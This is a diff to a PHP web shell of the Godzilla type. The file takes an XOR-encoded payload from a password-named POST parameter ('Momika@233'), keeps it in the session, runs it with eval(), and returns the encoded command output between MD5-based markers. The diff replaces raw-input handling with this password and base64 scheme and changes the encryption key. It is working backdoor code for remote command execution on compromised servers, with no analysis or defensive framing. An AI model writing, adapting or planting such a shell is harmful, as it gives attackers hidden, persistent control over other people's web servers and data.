@@ -9,18 +9,20 @@ function encode($D,$K){
     }
     return $D;
 }
+$pass='Momika@233';
 $payloadName='payload';
-$key='fae0b27c451c7288';
-$data=file_get_contents("php://input");
-if ($data!==false){
-    $data=encode($data,$key);
+$key='3a2a9aef4cbed812';
+if (isset($_POST[$pass])){
+    $data=encode(base64_decode($_POST[$pass]),$key);
     if (isset($_SESSION[$payloadName])){
         $payload=encode($_SESSION[$payloadName],$key);
         if (strpos($payload,"getBasicsInfo")===false){
             $payload=encode($payload,$key);
         }
 		eval($payload);
-        echo encode(@run($data),$key);
+        echo substr(md5($pass.$key),0,16);
+        echo base64_encode(encode(@run($data),$key));
+        echo substr(md5($pass.$key),16);
     }else{
         if (strpos($data,"getBasicsInfo")!==false){
             $_SESSION[$payloadName]=encode($data,$key);
